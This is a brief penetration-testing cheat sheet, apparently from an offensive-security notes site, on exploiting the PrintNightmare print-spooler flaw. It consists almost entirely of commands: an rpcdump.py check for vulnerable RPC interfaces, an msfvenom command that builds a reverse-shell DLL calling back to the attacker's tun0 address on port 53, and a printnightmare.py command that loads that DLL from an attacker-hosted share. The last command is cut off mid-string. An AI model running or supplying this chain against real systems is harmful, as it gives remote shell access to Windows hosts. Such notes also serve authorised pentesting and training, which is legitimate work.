# Remote Procedure Call

### Print Nightmare

```
rpcdump.py @$ip | egrep 'MS-RPRN|MS-PAR'
```

_If the output is the following contains the following, it is vulnerable._

```
Print System Aschronous Remote Protocol
```

```
Print System Remote Protocol
```

{% code overflow="wrap" fullWidth="false" %}
```
msfvenom -p windows/x64/shell_reverse_tcp lhost=$tun0 lport=53 -f dll -o /opt/winreconpack/thescriptkid.dll
```
{% endcode %}

{% code overflow="wrap" %}
```
python3 printnightmare.py domain.local/user:password@$ip '\\$tun0\winreconpack\thescriptk
```
{% endcode %}
